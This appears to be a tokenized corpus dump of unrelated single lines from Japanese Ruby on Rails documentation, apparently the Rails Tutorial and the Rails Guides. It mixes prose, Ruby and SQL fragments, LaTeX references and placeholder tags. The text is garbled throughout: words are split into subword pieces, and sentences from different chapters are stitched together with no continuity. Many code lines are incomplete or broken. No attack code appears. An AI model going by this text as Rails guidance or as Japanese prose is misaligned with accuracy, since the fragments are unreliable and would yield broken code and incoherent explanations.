▁c attr _ accessor ▁: first _ name , ▁instance _ reader : ▁false
▁=> ▁#< User ▁id : ▁1, ▁name : ▁" Michael ▁Hartl ", ▁email : ▁" mhartl @ example ▖ com ",
▁( 図 \ ref { fig : user _ model _ sketch } の ス ケ ッ チ には 無 か った マジックカラム が追加され ています ) 。
▁# ▁最初の ユーザー を返す
▁ コレクション を レンダリング するときに も `: layout ` オプション を指定できます 。
▁ 仕 上 げ に 、 最初の ユーザー だけ を デフォルトで 管理者 に するよう サンプルデータを 更新 しましょう ▁( リスト \ ref { code : po p ul at or _ with _ admin }) 。
▁上の アプリケーション は以下のように 動作します 。
▁ データモデル の作成 を 初めて 行った
▁今回の場合 は 、 オブジェクトが保存される 時点 で 処理を 実行 したい ので 、\ k ode { before _ save } という コールバック を使います ▟ これ を使って 、 ユーザー をデータベースに保存する 前に email 属性を 強制的に 小文字 に変換 します
▁\ k ode { micropost \_ params } で S trong ▁Parameters を使用している ことにより 、 マイクロポストの \ k ode { content } 属性 だけ が Web 経由で 変更 可能 になっている ことに注目してください 。
▁class ▁ Invoice ▁< ▁ActiveRecord :: Base
▁ 静的なページ の作成 は 、\ k ode { 第 {1} 2 {/1} 章 } で scaffold 生成 に 使用 した {2} generate {/2} スクリプト で 、 コントローラを生成 することから始め ます 。
▁Ruby では \ k ode { nil } と \ k ode { false } 以外の すべての オブジェクトは 、 真 偽 値 では \ k ode { true } になる ▁(\ ref { sec : objects _ and _ message _ passing }) ▁という 性 質 を 考 慮 すると 、 & & の 前 後 の値 の 組み合わせ は 表 \ ref { table : user _ and _ and } のようになります 。
▁Rails 同 梱 の SQLite 3 に代えて MySQL を採用し た場合 、` config / database ▖ yml ` の 記 述 方法を 少し 変更します 。
▁@ supplier ▖ account ▁= ▁@ account
▁` extract !` メソッドは 、 レシーバの ハッシュの サブクラス と同じ サブクラス を返します 。
▁JavaScript の Sprockets ディレクティブ は ` //= ` で 始 まり ます 。
▁" Help "
▁* ▁API ドキュメント を 効果 的に 書く 方法
▁ 名前を持つ モジュール は 、 対応する 定数 に保存 されている 場合に 到 達 可能 ▁( reachable ) ▁ となります 。
▁{0} 図 5 ▖9{/0} ▁{1} \ href { http ://0▖0▖0▖0:3000/ signup }{/ signup } で表示される 新しい ユーザー登録ページ {/1}
▁ これはリスト \ ref { code : installing _ rails } で使用されていました 。
▁# ▁=> ▁email s ▁to ▁me @ email ▖ com ▖
▁` blorgh ` が インストール されている アプリケーションの ` config / initializers / blorgh ▖ rb ` に イニシャライザ を作成して 、 以下の 記 述 を追加します 。
▁ フィーチャー ファイル の中で は \ k ode { Given } は単なる 文字列 ですが 、 ステップ ファイル の中で は \ k ode { Given } は \ emph { メソッド } であり 、 正規表現 と ブロック を引数に取り ます 。
▁user 	 0 m 7▖2 4 0 s
▁Sun , ▁ 15 ▁A ug ▁2010 ▁ 23:59:59 ▁UTC ▁+00:00
▁as : ▁: item , ▁local s : ▁ { title : ▁" Product s ▁P age "} ▁%>
▁* ▁` config / routes ▖ rb ` での 名前空間 分 離
▁ 単 一 の フィード ア イ テ ム 用の パーシャル
▁# ▁email ▁: string ( 2 55 )
▁ 見つからない 場合は エラー になります 。
▁ 極 め つ け は 、 Git ▁ や ▁GitHub 、 Heroku ▁ の 実 例 に含め ている 点 です ▟ このような 、 実際の 開発 現 場 で 使 わ ている ツール も チュートリアル に含まれている ため 、 読者 は 、 ま る で 実際の プロジェクト の開発 プロセス を 体 験 している か のような 感 覚 が 得 られる はずです 。
▁ 短い ドキュメント では 、 ス ニ ペ ッ ト を 紹 介 する 際に " Example s " と 明示的に ラベル を 付ける 必要はない ▟ 単 に パ ラ グ ラ フ に従う ようにします 。
▁create の ときに 既に 行った ように 、 記事 の 更新 に 失敗 して エラーが発生し た場合 、 その ことを ユーザーに 伝える ようにしましょう 。
▁def ▁ initialize ( x , ▁ y )
▁これで サンプルユーザー に 、 フォローしているユーザー の配列 と フォロワー の配列 が で きました ▟ ユーザープロファイルページ と Home ページ を更新し て これを 反 映 しましょう 。
▁ ポリモーフィック関連付け の 図 ]( images / polymorphic ▖ png )
▁( リスト \ ref { code : user _ login _ test _ valid _ information } で \ k ode { users (: michael )} と 書く と 、 リスト \ ref { code : real _ user _ fixture } の フィクスチャ ユーザー を参照 して いた ことを思い出しましょう ) 。
▁この shim パーシャル の場合は 、 リスト \ ref { code : layout _ new _ structure } の わずか 3 行 の shim コード だけです 。
▁これは 、 再設定 用の リンクをクリックすると 、 前 者 では メールアドレスが \ k ode { params [: email ]} に 保存されます が 、 後 者 を使用すると \ k ode { params [: user ] [: email ]} に保存 されてしまう からです 。
▁( リスト \ ref { code : sample _ microposts } の ループ の順序 に 違 和 感 がある かもしれませんが 、 これは \ ref { sec : the _ status _ feed } で ステータスフィード ▁( いわゆる タ イ ム ラ イン ) ▁ を実装する ときに 役 立 ち ます 。
▁ Hello ▁World "
▁ここまで く れば 、 すべての テストはパスするはずです ▟ そして Users リソース と Users コントローラ 、 User モデル 、 Users ビュー も 今 や 完全に 動作します 。
▁ セキュリティ 関連の issue を扱う 方法 の詳細については 、[ Rails セキュリティ ポ リ シ ー ページ ]( http :// rubyonrails ▖ org / security ) ▁( 英語 ) ▁ を参照してください 。
▁#### ▁ 安全 な 文字列
▁リスト \ ref { code : gitignore } のとき
▁また 、 ルート URL のときと同様に 、\ k ode { help _ path } や \ k ode { help _ url } といった 名前付きルート も 使える ようになります 。
▁リスト \ ref { code : universal _ css } の CSS の 形式 は 一 貫 しています 。
▁$ ▁R U B Y O P T = - W 0 ▁bundle ▁exec ▁rake ▁test
▁self を省略した 結果を リスト \ ref { code : test _ do ub le _ logout } に示します 。
▁* ▁ ヘッダー と コンテンツ を指定して ファイル名 を渡すと 、 それらの 設定 が Action ▁Mailer と Mail によって 使用されます 。
▁match ▁' / ' ▁=> ▁' root # index ', ▁via : ▁: get
▁ ユーザーを 直 前の ページに 戻 す 、 特殊な リダイレクト も 行えます 。
▁Rails では 、 テスティング を 容易に するために 3 つの [ ビルトイン アサーション ]( http :// api ▖ rubyonrails ▖ org / classes / ActionDispatch / Assertion s / Routing Assertion s ▖ html ) ▁ が 用意されています 。
▁図 \ ref { fig : signup _ form } では フォームの HTML が どう な っている か を簡単に 説明しました ▁( リスト \ ref { code : signup _ form _ html } 参 照 ) ▁ が 、 フォーム を理解する には \ emph { ユーザー登録 の 失敗 のとき } が 最も 参 考 になります 。
▁Rails の 統合テスト では 、 上の ステップ を コード に 落とし 込 んで い く ことになります ▁( リスト \ ref { code : layout _ links _ test })▟ 具体的には 、 まず \ k ode { assert _ template } メソッドを使って 、 Home ページ が 正しい ビューを 描画 している かどうか 確かめ ます
▁ このような 場合 、` extract _ options !
▁ これはリスト \ ref { code : show _ only _ active _ users _ exercise } で使用されていました 。
▁### ▁SQL フラグ メ ン ト 文字列 を使用する
▁ SELECT ▁* ▁FROM ▁clients ▁OR DER ▁BY ▁clients ▖ id ▁ASC ▁LIMIT ▁1
▁** マルチ サーバー 環境で ファイル名 が 異 な っ てしまう こと がある
▁ スタイル を 整 え るため 、 もう少し CSS ルール を追加します ▁( リスト \ ref { code : remember _ me _ css }) 。
▁` rake ▁secret ` を実行し 、` development ` セクション ` test ` セクション に 新しい 鍵 を生成します 。
▁Date ▖ new (201 0, ▁4 , ▁30 )▖ months _ since (2) ▁# ▁=> ▁We d , ▁30 ▁Jun ▁2010
▁ EXPLAIN ▁for : ▁ SELECT ▁` users ` ▖
▁` ActiveRecord :: Core :: Class Methods # a rel _ table ` を 例 に 説明します 。
▁has _ many ▁: to do s , ▁primary _ key : ▁: guid
▁ 一部の バックエンド では 、 リ ッ ス ン する キュー を指定する 必要がある もの があります 。
▁ すべての ユーザーを 一覧 する ページ
▁rest ▁= ▁hash ▖ extract !( : a )▖ class
▁c attr _ accessor (: emulate _ boolean s ) ▁ { ▁true ▁ }
▁ Module ▖ new ▖ anonymous ?
▁ } }╼\ end { figure }╼╼ ▁% ▁subsection ▁header ▁( end )╼╼ ▁\ subsection { Bootstrap と カスタム CSS } ▁% ▁( fold )╼ ▁\ label { sec : custom _ css }╼╼
▁` group ` メソッドは 、 結果を グループ 化 する 際の 属性 名を 1 つ 指定します ▟ 内部 的に は SQL の ` G R O U P ▁BY ` 句 が使用されます 。
▁id ▁in t ( 11 ) ▁ NOT ▁NULL ▁ auto _ increment ,
▁ パーシャル 内 の場合と同様 、 この レイアウト でも 現在の オブジェクト と ( オブジェクト 名 ) _ counter 変数 を使用できます 。
▁ サンプル コードの インデント には スペース 2 文字 を使用すること ▟ マークアップ 用 には 左 マージ ン に合わせて スペース 2 文字 を使用します 。
▁ assoc ▖ has _ many ▁: ex p en s es
▁* ▁` collection ▖ delete ( object , ▁ ▖▖▖)
▁# ▁< import ed - from - svn ▁type =" boolean "> false </ import ed - from - svn >
▁ デフォルトの User テスト ▁( モ ッ ク のみ )
▁ テストは パス するか 、
▁ cat ▁< ファイル名 >
▁ これまで メールアドレスを ユーザー名 として 使用 し てきた ので 、 このような \ k ode { find } 関連 メソッドは 、 ユーザーを サイトに ログイン させる 方法 を学ぶ ときに 役に立ちます ▁( Chapter ~\ ref { cha : sign _ up }) 。
▁ このままでは 実 用に 耐 え ないので 、` show ` アクション を追加して 先に 進 む ことにしましょう 。
▁* ▁Active ▁Record の クエリ キャッシュ を有効に します 。
▁ リレーション によって トリガ される クエリ で EXPLAIN を実行する ことができます 。
▁( Ajax を 多 用 する アプリケーションを 徹 底 的に テスト したい 方は 、\ href { http :// s elenium h q ▖ org /}{ S elenium } と \ href { http :// w at ir ▖ com /}{ W at ir } を参照 してみてください ) 。
▁上の シナリオ が 信 じ が たい もの のように 思える かもしれませんが 、 どう か 信 じ てください ▟ Rails の Web サイト では 、 トラフィック が多い ときに このような 問題 が発生する 可能性 がある のです 。
▁ 関連 名 から 関連 相手 の オブジェクト 名を 生成 できない 事 情 がある場合 、`: class _ name ` オプション を使用して モデル名 を直接 指定 できます 。
▁$ ▁bin / rails ▁g ▁model
▁def ▁c amp a ig n _ message ( business , ▁user )
▁ //= ▁require ▁ jquery
▁redirect _ to ▁photos _ url
▁ 以後 は 、 単 に 以下 を実行する だけで 同じ プッシュ が 行われ る ようになります 。
▁ オブジェクトを デ ィ ー プ コピー する 必要がある 場合は ` deep _ dup ` を お 使い ください 。
▁ 別の ユーザーに 所 属 している マイクロポスト を追加する
▁redirect _ to ▁@ article
▁さらに 、
▁図 \ ref { fig : user _ profile _ microposts _ no _ st y l ing } の ページ には マイクロポスト 固有の スタイル が与えられ ていない ので 、 リスト \ ref { code : micropost _ css } を追加して 、 結果 の ページ を見てみましょう
▁m attr _ accessor ▁: warning s _ on _ first _ load
▁╼╼ ▁\ section { 動 機 } ▁% ▁( fold )╼ ▁\ label { sec : motivation }╼╼
▁ フィンガープリント は production 環境で はデフォルトで オン になっ ており 、 それ以外の 環境では オフ になります 。
▁` File ▖ atomic _ write ` クラス メソッドを使用すると 、 書き かけ の 文 章 を 誰 にも 読 まれ ない ように ファイルを 保存 することができます 。
▁3 日 間 で 読 破 するのは 異 常 です !
▁この コレクション を 作る ために 、 以下の コンソール セッション に示した ような 、 文字列 の配列 を簡単に 作 れる \ k ode { % w [ ]} という 便利な テクニック を 知 っ ておく と 良い でしょう 。
▁この リンクをクリックすると フォーム が表示され 、 そこで 新しい 記事 を作成する ことが できるようになります 。
▁この 設定 は ` scaffold ` ジェネレータ の 実行時に 使用されます が ▟ この フック は 他の ジェネレータ でも 使用されます 。
▁<%= ▁@ re view ▖ title ▁%> ▁<% # ▁ 必要に応じて エスケープ される ので 問題 な し ▁%>
▁class ▁Co un try ▁< ▁ActiveRecord :: Base
▁つまり 、 以下のコード を実行すると 、
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api ▖ rubyonrails ▖ org / v 4▖2▖0 ▖ be t a 4/ classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を読んでみてください 。
▁ チェック されていない パラメータを まるごと モデル に保存 する 行 為 は 、 モデル に対する 「 マスアサインメント 」 と呼ばれ ています ▟ これ が発生する と 、 正 常 な データ の中に 悪意のある データ が含まれ てしまう 可能性があります 。
▁ ログインフォーム の 編集 が終わった ので 、 チェックボックス が オン の ときに ユーザーを 記 憶 し 、 オフ の ときには 記 憶 しない ようにします 。
▁ 前 四 半 期 または 来 四 半 期 の 同じ 日 の 日付 を返します 。
▁ どの パーシャル にも 、 パーシャル 名 から アンダースコア を 取り 除 いた 名前を持つ ローカル変数 が与えられ ます 。
▁" K ur t ▁G ö d el "▖ parameterize ▁# ▁=> ▁" k ur t - g ode l "
▁上のコードは 、 Article コントローラ のコード を書いて い たとき よりも 何 だ か 複 雑 に見えます 。
▁* ▁` config ▖ i 18 n ▖ en force _ available _ locales ` が オン になっている と 、` available _ locales ` リスト で 宣言 されていない ロケール は i 18 n に 渡 せ なくなります ▟ 利用 できない ロケール がある場合 は ` i 18 n :: In valid Local e ` 例外が発生します 。
▁t ▖ integer ▁: customer _ id
▁ プロファイル 画像 の 編集 は 、 画像 の アップロード を Gravatar に 任 せ て あるので 、 既に 動作する ようになっています ▟ 図 \ ref { fig : edit _ page } の ▁[ change ] ▁ リンクを クリック すれば 、 図 \ ref { fig : gravatar _ c r o p p er } のように Gravatar を 編集 できます 。
▁ 手順 を追加した テストを リスト \ ref { code : user _ signout _ test } に示します 。
▁ アプリケーションの 設定 に 、 下 記 のコード を追加 してください 。
▁ び っ く り する ほど 早く 反 応 が も ら え ること も あれば 、 そうでない こともあります 。
▁` params ` メソッドは 、 フォームから送信 され てきた パラメータ ▁( つまり フォームの フィールド ) ▁ を表す オブジェクト です 。
▁ Location : ▁ / photos /1
▁` template _ path ` には パス の配列 を指定することもできます ▟ この場合 探 索 は 配列 順に 沿 って 行われます 。
▁d ▖ next _ year ▁# ▁=> ▁We d , ▁28 ▁Feb ▁200 1
▁( client s ▖ first _ name ▁= ▁' Ryan ' ▁ AND ▁orders ▖ status ▁= ▁' receive d ')
▁` all _ day ` メソッドは 、 現在 時刻 を含む その 日 一 日 を表す 範囲 を返します 。
▁# ▁< rank ▁type =" integer "> 53 </ rank >
▁この 処理 は 、 すべての レコードが 処理 される まで 繰 り 返 されます 。
▁次に 、 その 検証 を コメントアウト し 、 失敗する テストを 書き 、 そして 検証 の コメントアウト を 解除 することで 、 その テストをパスさせ られる かどうかを確認 します 。
▁Active ▁Job では 、 ジョブ 実行時に 発生 する 例外 を キャッチ する方法 が 1 つ 提供され ています 。
▁\ k ode { subject } メソッドを使用して \ k ode {@ user } から \ k ode { other _ user } に 対象 を 切り 替 え ていること で 、 フォロワー の リレーションシップ のテスト を 自然に 実行 でき ていることに注目してください 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁さらに 言 えば 、 最 近 の Rails への 変更 ▁(\ ref { sec : adding _ a _ secure _ password }) ▁ により 、 カスタム 認証システムを 容易に 作成 できるようになりました 。
▁xml ▖ cha n n el ▁do
▁デフォルトでは 、 整 数 または 浮 動 小 数 点 にマッチし ます ▟ これら の冒頭 に 符 号 が 付 いて いる場合 も マッチ します 。
▁ 1234567890▖50 6 ▖ to _ s (: currency , ▁ precision : ▁3 ) ▁# ▁=> ▁$ 1, 2 34 , 5 67 , 89 0▖5 06
▁This ▁is ▁the ▁first ▁application ▁for ▁the
▁ ╼ ▁ ▖
▁` config ▖ action _ dispatch ▖ x _ send file _ header ` オプション 経由で 設定 を変更 できます 。
▁ これはリスト \ ref { code : sessions _ resource } で使用されていました 。
▁リスト \ ref { code : sidebar _ css } では \ k ode { ▖ gravatar \_ edit } という CSS クラス を追加 しています ▟ これは 第 \ ref { cha : updating _ showing _ and _ deleting _ users } 章 でも 使われ ます 。
▁ ログインフォーム のコード
▁class ▁ Proc ess V ide o J ob ▁< ▁ ActiveJob :: Base
▁GitHub への プッシュ は 必 須 ではありません が 、 GitHub の メンバー になっ ておく と 、 多くの オープンソース プロジェクト に 参 加 できるようになります 。
▁### ▁ 複数の オブジェクトを バッチ で 取り出す
▁ Cloud ▁IDE では 、 次の コマンドで この プログラム をインストール できます
▁* ▁` uniq `
▁ パーシャル に オブジェクトを 渡す ために 、 値が オブジェクト で 、 キー が パーシャル での 変数 名 と同じ ハッシュ を 利用 します ▟ これで 、 リスト \ ref { code : micropost _ form } の 2 行目 のコード が 完成 します 。
▁#### ▁ 対応策
▁{0} 図 7 ▖7{/0}{1} ユーザープロファイルページ \ href { http :// localhost :3000/ users /1}{/ users /1 } に デフォルトの Gravatar が表示されている ▟\ href { http :// railstutorial ▖ org / images / figures / profile _ with _ gravatar _ bootstrap _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁method
▁| ▁HTTP ▁ 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁名前付きヘルパー ▁|
▁Ruby ▁on ▁Rails には 2 種類の ドキュメント があります ▟ ひとつ はこの ガイド であり 、 Ruby ▁on ▁Rails を学ぶ ためのものです ▟ もうひとつ は API ドキュメント であり 、 こちら は リ フ ァ レ ン ス 用 です 。
▁now ▁+ ▁1▖ year
▁たとえば 、` Client ▖ find _ by _ first _ name _ and _ locked (" Ryan ", ▁true ) ` のように か く ことができます
▁ といった 省略 記 法 でも 、 うまく 動 きます 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / in tr o spec tion ▖ rb ` です 。
▁| ▁GET ▁| ▁ / photos ▁| ▁photos # index ▁| ▁ すべての 写 真 の一覧を表示 ▁|
▁duplicate ▁# ▁=> ▁[ ' foo ', ▁' another - string ']
▁ private
▁### ▁` remove `
▁たとえば 、` new ` メソッドを使用して 新しく オブジェクトを 作成した だけで は 、 オブジェクトは データベースに 属 していません 。
▁ただし 、` atomic _ write ` メソッドが ファイルの オーナー シ ッ プ と パ ー ミ ッ ション を変更 できない ケース が まれ に あります ▟ この エラー は キャッチ され 、 その ファイルが それを 必要 と する プロセス から アクセス できるように するために 、 ユーザーの ファイルシステム への 信 頼 を スキップ します 。
▁変更の結果 を リスト \ ref { code : following _ p _ follow _ bang } に示します 。
▁# ▁Return s ▁true ▁if ▁no ▁errors ▁are ▁found , ▁false ▁otherwise ▖
▁ テスティング を なるべく 簡 便 かつ 柔 軟 性 の高い 方法 に 代 え ました 。
▁{0}{1} 第 7 章 {/1}{/0} では 、 HTTP ▁\ text tt { POST } リクエストを Users コントローラの \ k ode { create } アクションに 発行する HTML フォーム を作成する ことで 、 ユーザーの サインアップ を実装 しました 。
▁ SELECT ▁count ( D IS T IN C T ▁clients ▖ id ) ▁AS ▁count _ all ▁FROM ▁clients
▁Rails ▁4 から 同 梱 される ようになった turbolinks ▁gem を使用している場合 、 ' data - turbolinks - track ' オプション が 利用できます ▟ これは アセット が更新され て ページに 読み 込 まれ た かどうかを turbolinks が チェック します 。
▁include ▁M
▁このとき 、 ▁リスト \ ref { code : microposts _ destroy _ action } の \ k ode { destroy } メソッドでは リダイレクト を 使 っ ている点に注目してください 。
▁* ▁Ruby ▁on ▁Rails の ドキュメント に 貢献 する方法
▁` author _ class ` メソッドが ` String ` ではなく ` Class ` を返す よう に変更し たので 、` Blorgh :: Article ` の ` belongs _ to ` 定義 も それ に合わせて 変更 する必要があります 。
▁ 変更を 反 映 した結果 を リスト \ ref { code : new _ password _ reset } と 図 \ ref { fig : forgot _ password _ form } に示します 。
▁### ▁ マージ
▁&& ▁ expiration _ date ▁< ▁Date ▖ today
▁create ▁app / views / microposts / show ▖ html ▖ erb
▁ コントローラ も モデル と同様に 名前空間化され ます ▟ ` Article sController ` という コントローラは ` Blorgh :: Article sController ` になり 、 この コントローラの ビュー は ` app / views / articles ` ではなく ` app / views / blorgh / articles ` に置かれ ます 。
▁### ▁` many ?
▁これ から Rails で 開発 を 始 め よう と する 人 は 「 と に か く \ emph { Web アプリケーション } を 作り たい !」 と 考え ていること が ほとんど なので 、 た った 1 つの Web ページ を作成する ために 5 00 ページ もの Ruby 本 を 読み 通 す 気 には な れ ない でしょう 。
▁### ▁ 記事 を削除する
▁ counter _ cache : ▁true
▁( リスト \ ref { code : email _ uniqueness _ index } で メールアドレス の 一意性 を 保 証 したり 、 リスト \ ref { code : micropost _ migration } で 使 った 複 合 キー インデックス と 比 較 してみてください ▟)
▁ 送信 した プルリクエスト が マージ される まで には 、 何 回 か 再 挑 戦 が必要になる でしょう 。
▁ここで \ href { http ://0▖0▖0▖0:3000/ users / new }{\ text tt { new } } ページに 戻 り 、 ユーザーを もう 1 人 作成 してみましょう ▟\ href { http ://0▖0▖0▖0:3000/ users }{\ text tt { index } } ページ を表示し てみると 、\ ref { fig : demo _ user _ index _ two _ rails _3} のように ユーザーが 追加 されています 。
▁上のコード の 代りに 、 以下のコード を使用する必要があります 。
▁` link _ to ` メソッドは 、 Rails の ビルトイン ヘルパー の 1 つ です 。
▁` collection ▖ delete ` メソッドは 、 外部キー を ` NULL ` に設定する ことで 、 コレクション から 1 つ または 複数の オブジェクトを 削除します 。
▁この 方法で コメント を作成する と 、 コメント と 記事 が自動的に リンク され 、 指定された 記事 に対して コメント が 従 属 するようになります 。
▁# ▁Time ▖ current ▖ advance ( months : ▁1) ▁ と 等 価
▁params ▖ require (: article )▖ permit (: title , ▁: text , ▁: author _ name )
▁ エンジンの ` app / assets ` ディレクトリ の下に も 、 通常の アプリケーション と同様に ` images `、` javascripts `、` stylesheets ` ディレクトリ が それぞれ あります 。
▁` root ▁' welcome # index ' ` と 記 述 することで 、 アプリケーションのルート URL へのアクセス を welcome コントローラの index アクションに 割り当て る よう Rails に 指示 が 伝 わ ります ▟ 同様に 、` get ▁' welcome / index ' ` は < http :// localhost :3000/ welcome / index > という リクエストを welcome コントローラの index アクションに 割り当て ます 。
▁### ▁` to _ s `
▁beginning _ of _ day ▁( midnight , ▁at _ midnight , ▁at _ beginning _ of _ day )
▁( 表 \ ref { table : demo _ RESTful _ users } と の違い を 比 較 してみてください ) 。
▁* ▁` config ▖ active _ record ▖ default _ time zone ` は 、 データベースから 日付 ・ 時刻 を取り出し た 際の タイムゾーン を ` Time ▖ local ` ▁( `: local ` を 指定した 場合 ) と ` Time ▖ utc ` ▁( `: utc ` を 指定した 場合 ) のどちら に するか を指定します 。
▁なお 、 S ublime ▁Text ▁ を 選 んだ 方 の 中の ために 、 より 高度な 設定 方法を 解説 した ▁\ href { https :// github ▖ com / mhartl / rails _ tutorial _ s ublime _ text } { Rails チュートリアル : ▁S ublime ▁Text } { p 1 } ▁ を用意し ました 。
▁` collection ▖ exists ?` メソッドは 、 指定された 条件 に 合 う オブジェクトが コレクション の中に 存在する かどうかをチェックします 。
▁ マイクロポストの 削除リンク と 試 作 フィード のモックアップ
▁たとえば ` 45 ▖ minute s ▁+ ▁2▖ hour s ▁+ ▁4 ▖ years ` のように 時間 の 計算 や 宣言 を 行なうことができます 。
▁ 失敗する テストが パス するよう になる ために 、\ k ode { flash } の代わりに \ k ode { flash ▖ now } を使用します ▟ これも ページ で フラッシュメッセージ を表示する ために 特に 設計 された メソッドです が 、\ k ode { flash } の場合 とは異なり 、 他の リクエスト が発生し たら すぐに メッセージ を 消 します 。
▁ これはリスト \ ref { code : delete _ link _ tests } で使用されていました 。
▁Rails の sanitize () メソッドは 、 このような エ ン コーディング 攻 撃 を か わ す 働 き を します 。
▁t ▖ references ▁: manager
▁` select ` メソッドを使用すると 、 関連付けられたオブジェクト の データ 取り出し に 使用される SQL の ` SELECT ` 句 を上書き します 。
▁* ▁Rails ▁4▖0 では 、 ハッシュ を使用する 旧 来 の find er ▁API が 非推奨 となり ました ▟ これまで find er オプションを 受け付け ていた メソッドは 、 これらの オプションを 今後 受け付け なくなります
▁本章では 、 このような 静的なページ の作成 について 学 んで い きます 。
▁ これはリスト \ ref { code : stylesheets _ partial } で使用されていました 。
▁ 最後の 例として 、 便利な \ k ode { inspect } メソッドを 紹介します ▟ これは 要求 された オブジェクト を表現する 文字列 を返します 。
▁Rails は 、 関連付け の名前 から 自動的に モデルの クラス名 を推測し ます ▟ 関連付け 名 が ` customer ` なら クラス名 を ` Customer ` と 推 測 します 。
▁Rails を含む 多くの Web フレームワーク は 、 HTTP の各 操作を 発 展 させた \ emph { REST ▁ アーキテクチャ } の 影 響 を受け ています ▟ {1} {2} 第 2 章 {/2}{/1} でも 簡単に触れ ましたが 、 {3} {2} 第 7 章 {/2} {/3} では 、 より 深 い 内容 について 学びます 。
▁% w ( a ▁b ▁c ▁d )▖ prepend (' e ') ▁# ▁=> ▁% w ( e ▁a ▁b ▁c ▁d )
▁つまり 、 正しい リクエストを 各 アクションに 向 け て 発行し 、 マイクロポストの 数 が 変 化 していない かどうか 、 また 、 リダイレクト される かどうかを 確かめ れば よい のです ▁( リスト \ ref { code : create _ destroy _ micropost _ tests }) 。
▁( リスト \ ref { code : db _ seed } のコードは 少し 応用 的 です ▟ 詳 細 が 完全に 理解 でき なくても 問題ありません )
▁A ▁ summary ▁of ▁the ▁data ▁model ▁for ▁users ▁appears ▁in ▁Figure ▁\ ref { fig : demo _ user _ model } ▖
▁{0}{1} 第 10 章 {/1}{/0} では 、 さらに 2 つの 改 善 を加え ます ▟ メールアドレス を使って アカウントを有効化する 機能 と ▁( すなわち 本当に 有効なメールアドレス か 検証 する プロセス と ) 、 ユーザーが パスワードを 忘れ てしまった ときの ための パスワード リ セット 機能 です 。
▁ ユーザー表示ページ を再度 読み込む と 、 今度は フラッシュメッセージ は 表示され なくなりました ▁( 図 \ ref { fig : signup _ flash _ reload ed }) 。
▁ サインイン できない
▁デフォルトでは 、 autoload _ path で 指定された すべての ファイルが 監 視 対象 となり 、 デフォルトで true が設定され ます 。
▁" hello "▖ at ( 4 ) ▁# ▁=> ▁" o "
▁block ▖ call
▁次の 行 は 少し わかりにくい かもしれませんが 、 Rails プログラミング では 定 番 の 手法 です 。
▁ 実は 、\ k ode { follower _ id } と \ k ode { followed _ id } を 入 れ 替 え る だけで 、 フォロワー についても ユーザーの フォロー のとき と まったく 同じ 方法 が 使用できます 。
▁ プ リ プロセス が 必要な ファイルは ` app / assets ` ディレクトリ の下に 置く 必要があります 。
▁ いつものように 、 統合テスト を生成する ところから始め ましょう 。
▁2 番目 に 新しいマイクロポスト を削除し た 後 のユーザー Home ページ
▁ 具体的には 、 Asset ▁Pipeline が すべての スタイルシート を 1 つの CSS ファイル ▁(\ k ode { application ▖ css }) ▁ に まとめ 、 すべての JavaScript ファイルを 1 つの JS ファイル ▁(\ k ode { javascripts ▖ js }) ▁ に まとめて く れ ます ▟ さらに 、 それらの ファイル すべて に対して ▁ 不要な 空白 や インデント を 取り除く 処理を 行い 、 ファイル サイズ を \ emph { 最小化 } してくれます 。
▁ 初めて の システム セットアップ
▁そこで 、` app / views / articles / new ▖ html ▖ erb ` を変更 して 、 エラーメッセージ がある場合 に 表示する ように してみましょう 。
▁ここでは 、 同じ ` _ box ` パーシャル を使用する 前 提 であり 、 先 の例 と同じ 出力 が 得られます 。
▁* ▁` _ form ▖ html ▖ erb `
▁ 本チュートリアル が 自分 に はまだ まだ 難 しい と 思 う 方 には 、\ href { http :// learn - rails ▖ com /}{ \ emph { Learn ▁Ruby ▁on ▁Rails } } ▁( D an i el ▁Ke h o e ) ▁ や \ href { http :// mb sy ▖ co / 7 Z d c 7 } { O ne ▁Mon th ▁Rails } を 先に 学 んで おくとよいでしょう ▟ どちらも まったく の 初心者 を 対象 と し ており 、\ emph { 本チュートリアル } よりも 敷居 が 低 く 設定 されています 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / string / indent ▖ rb ` です 。
▁StaticPages コントローラ を生成する 。
▁ ご想像 のとおり 、 これらの ファイル では JavaScript と 埋め込み Ruby ▁( ERb ) ▁ を ミ ッ ク ス して 現在の ページ に対する アクション を実行する ことができます 。
▁また 、 この fixture は 第 \ ref { cha : log _ in _ log _ out } 章 になる まで 使わない 予 定 なので 、 今 の ところ は これらの データを 削除 しておき 、 ユーザー用の fixture ファイルを 空 に しておきましょう ▁( リスト \ ref { code : empty _ fixtures }) 。
▁Rails のルーティング では 自由に ルール を定義する ことができ 、 また 、 その 際に 名前付きルート も 使えるように なる
▁Home ページに ステータスフィード が表示され 、 フォロー の カウント が 1 増え た
▁XSS ▁A udi to r をオフに したい場合は ' 0 ; ' を指定します ( レスポンス が リクエスト パラメータ からの スクリプト を 含 んで いる場合 に 便利です ) 。
▁get ▁' search ', ▁on : ▁: collection
▁ Hello , ▁Rails !
▁require ▁' active _ support / all '
▁図 の 矢 印 で 示 されている ように 、 こ の目的は 、 現在のユーザー によって フォロー されている ユーザー に対応する ユーザー id を持つ マイクロポスト を取り出し 、 同時に 現在のユーザー 自身 のマイクロポスト も一緒に 取り出す ことです 。
▁### ▁` errors [ ]`
▁get ▁' photos /* other ', ▁to : ▁' photos # unknown '
▁ユーザーの サインイン 状態 を 保 持 する ひとつ の 方法は 、 伝 統 的な Rails セッション ▁( 特殊な \ k ode { session } 関数 を使用 ) ▁ を使って 、 ユーザー ID に 等 しい 「\ emph { 記憶トークン ▁( remember ▁token ) }」 を 保 持 することです 。
▁デフォルトでは 、 コンソール は \ emph { development ▁( 開発 ) ▁ 環境 } という 、 Rails によって 定義された 3 種類の 環境 のうち の 1 つ で 起動 します ▁( 他の 2 つ は \ emph { test ▁( テスト ) ▁ 環境 } と \ emph { production ▁( 本番 ) ▁ 環境 } です ) 。
▁この 変更 を行なう には 、 エンジン を ホスト する Rails アプリケーションに ` Application Controller ` という名前の コントローラ が存在する 必要があります 。
▁* ▁ メールの body に nil 以外の 値が 設定 されている 場合 、 Mailer ▁ Fi lt ers は 処理を 中 止 します 。
